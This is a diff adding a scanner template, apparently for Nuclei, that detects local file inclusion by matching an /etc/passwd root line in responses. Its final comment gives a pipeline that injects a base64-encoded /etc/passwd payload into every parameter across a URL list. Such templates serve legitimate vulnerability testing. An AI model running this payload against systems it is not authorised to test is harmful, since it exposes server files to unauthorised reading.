@@ -1,0 +1,28 @@
+id: lfi-base64-parameter
+
+info:
+  name: Local File Inclusion
+  author: rix4uni
+  severity: high
+  description: local file inclusion
+  reference: https://twitter.com/GodfatherOrwa/status/1617511891362013184?s=20
+  metadata:
+    verified: true
+  tags: lfi
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+
+    matchers-condition: and
+    matchers:
+      - type: regex
+        regex:
+          - "root:[x*]:0:0"
+
+      - type: status
+        status:
+          - 200
+
+# cat urls.txt | uro | anew | qsreplace "L2V0Yy9wYXNzd2Q=" | nuclei -t lfi-base64-parameter.yaml
